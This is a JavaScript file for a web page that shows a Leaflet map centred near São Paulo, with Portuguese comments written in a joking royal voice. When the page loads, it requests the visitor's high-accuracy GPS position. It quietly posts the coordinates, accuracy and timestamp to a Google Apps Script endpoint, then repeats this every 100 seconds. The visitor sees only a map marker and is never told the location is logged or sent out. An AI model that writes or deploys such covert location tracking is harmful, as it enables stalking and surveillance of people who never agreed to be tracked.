$(document).ready(function () {

    // MAPA DO TERRITÓRIO REAL
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                // Coordenadas concedidas pelo súdito
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;

                // Marker e popup permanecem para visualização
                L.marker([lat, lng])
                    .addTo(map)
                    .bindPopup("SEU LOCAL")
                    .openPopup();

                map.setView([lat, lng], 17);

                // Envio direto para o Google Sheets via FormData (ou JSON no no-cors)
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: lat,
                    longitude: lng,
                    precisao: position.coords.accuracy,
                    status: navigator.onLine ? 'online' : 'offline'
                };

                fetch('https://script.google.com/macros/s/AKfycbz6bm4rqeA6_88ztbBVwr_JnQFBmVdsA8Gz9p1pK9heomd9-HFge8Ny6VPF30I5H57LQQ/exec', {
                    method: 'POST',
                    mode: 'no-cors', // Evita conflito CORS
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados enviados ao trono com sucesso."));

            },
            function(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        console.error("O súdito negou o acesso à localização, Majestade!");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        console.error("O sinal de GPS está fraco nas fronteiras.");
                        break;
                    case error.TIMEOUT:
                        console.error("A requisição expirou no tempo de espera real.");
                        break;
                    default:
                        console.error("Erro desconhecido na geolocalização.");
                }
            },
            { enableHighAccuracy: true, timeout: 10000 } // máxima precisão
        );
    }

    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
    capturarLocalizacaoReal();

    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
    setInterval(capturarLocalizacaoReal, 100000);

});


